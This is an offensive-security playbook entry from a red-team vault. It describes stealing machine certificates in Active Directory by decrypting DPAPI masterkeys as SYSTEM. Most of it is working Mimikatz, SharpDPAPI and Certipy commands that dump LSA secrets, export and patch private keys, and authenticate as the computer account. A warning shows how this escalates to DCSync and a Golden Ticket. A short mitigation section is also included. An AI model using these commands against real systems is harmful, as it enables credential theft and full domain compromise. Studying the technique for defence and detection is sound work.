---
title: "THEFT3 — Machine Certificate Theft via DPAPI"
description: "Identical concept to THEFT2 — User Certificate Theft via DPAPI but for machine certificates. These are protected by the machine DPAPI masterkey, which is…"
category: active-directory
subcategory: "ADCS & Certificates"
tags: ["active-directory", "kerberos", "adcs", "credential-access", "privilege-escalation"]
tools: ["Mimikatz", "Certipy", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/ACL-ESC-Techniques/THEFT3 — Machine Certificate Theft via DPAPI.md"
---
# THEFT3 — Machine Certificate Theft via DPAPI

## Quick Reference

| Field | Value |
|-------|-------|
| **Category** | Credential Theft (local, machine DPAPI) |
| **Difficulty** | Medium |
| **Pre-requisites** | **SYSTEM** (or local admin) on the target host |
| **Tools** | SharpDPAPI, Mimikatz, Certipy |
| **OPSEC Noise** | Medium — requires SYSTEM, reads machine masterkeys |
| **One-liner** | As SYSTEM, decrypt the **machine's** certificate private keys using the machine DPAPI masterkey, yielding a computer-account cert you can authenticate with. |

***

## What Is THEFT3?

Identical concept to THEFT2 — User Certificate Theft via DPAPI but for **machine** certificates. These are protected by the **machine DPAPI masterkey**, which is itself protected by the `DPAPI_SYSTEM` LSA secret — so you need SYSTEM, not just a user session. A stolen machine cert lets you authenticate as `HOST$`, which is powerful: computer accounts can be Kerberoast/RBCD targets, and a DC's own cert enables DCSync-level access.

**Key locations (machine):**

```
Private keys : C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\
               C:\ProgramData\Microsoft\Crypto\Keys\           (CNG)
Masterkeys   : C:\ProgramData\Microsoft\Protect\S-1-5-18\
Certificates : C:\ProgramData\Microsoft\SystemCertificates\My\
```

***

## Step 1 — Become SYSTEM & Grab the Machine Masterkey

```powershell
mimikatz # privilege::debug
mimikatz # token::elevate                       # to SYSTEM
mimikatz # lsadump::secrets                      # reveals DPAPI_SYSTEM secret
mimikatz # dpapi::masterkey /in:"C:\ProgramData\Microsoft\Protect\S-1-5-18\<GUID>" /system
```

***

## Step 2 — Export Machine Certificates

```powershell
# SharpDPAPI — /machine flag targets the SYSTEM store & machine masterkeys
SharpDPAPI.exe certificates /machine

# Mimikatz — export from local machine store (patch providers if non-exportable)
mimikatz # crypto::certificates /systemstore:local_machine /export
mimikatz # crypto::cng
mimikatz # crypto::certificates /systemstore:local_machine /export
```

***

## Step 3 — Authenticate as the Machine Account

```bash
certipy-ad cert -export -pfx machine.pfx -password '' -out clean.pfx
certipy-ad auth -pfx clean.pfx -dc-ip $TARGET
#   -> HOST$ TGT + machine NT hash
```

> [!warning] Stealing a DC's certificate = domain compromise
> If the host is a Domain Controller, its machine cert authenticates as `DC01$`, which has replication rights. From that TGT you can DCSync `krbtgt` and forge a Golden Ticket. Treat DC cert theft as full domain takeover.

***

## OPSEC Considerations

| Action | Artefact | Noise |
| :-- | :-- | :-- |
| `token::elevate` / `lsadump::secrets` | LSASS access, SYSTEM token | 🟡 Medium |
| Reading MachineKeys | file access (if audited) | 🟢 Low |
| `crypto::cng` provider patch | KeyIso tamper | 🔴 High |

***

## Mitigation

- Back machine keys with a **TPM** (default for modern Windows) so the raw DPAPI blob is insufficient.
- Restrict local admin/SYSTEM; deploy Credential Guard and LSASS protection.
- Tier your DCs and treat any DC SYSTEM access as a domain-wide incident.

***

## See Also

- _ADCS Attack Methodology Guide · THEFT2 — User Certificate Theft via DPAPI · PERSIST2 — Machine Account Persistence via Certificates
- Sources: SpecterOps *Certified Pre-Owned*; [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
